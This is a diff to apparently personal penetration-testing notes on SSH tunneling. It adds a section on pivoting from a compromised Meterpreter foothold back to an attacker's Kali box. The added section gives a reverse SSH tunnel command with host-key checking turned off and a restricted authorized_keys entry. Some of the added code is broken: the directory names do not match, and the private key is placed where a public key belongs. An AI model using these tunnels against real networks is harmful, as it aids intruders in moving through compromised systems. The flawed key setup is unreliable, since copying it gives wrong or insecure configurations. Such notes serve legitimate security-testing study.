@@ -67,12 +67,26 @@ ssh -f -N -L port:127.0.0.1:port user@ip -i id_rsa
 -f
 ```
 
-f you need ssh-keys
+If you need ssh-keys
 ```bash
 ssh-keygen
 cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 chmod 644 id_rsa.pub
 ```
+
+If running through some shells like Meterpreter we need to have some host key acceptable, without using our Kali Password!
+```bash
+ssh -f -N -R $kali-port-for-ssh:$ssh-ip-connection:22 -R $kali-port-second-for-Service:$Network-IP:$Service-Port-To-Tunnel-To$ -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@$kali-IP 
+```
+For the keys and assured non-interactivity of ssh to tunnel correctly:
+```bash
+mkdir /tmp/key -p; cd keys
+ssh-keygen 
+#Enter location: /tmp/key/id_rsa
+	from="$foothold-ssh-ip",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa $ssh-rsa=$(cat id_rsa) $foothold-user-base-reverse-shell@poornetwork
+```
+This entry will allow the foothold key owner of the private key to log in to Kali, without RCE-ing ourselves and allows for port forwarding.
+
 
 Back to the trusty ascii art:
 ```
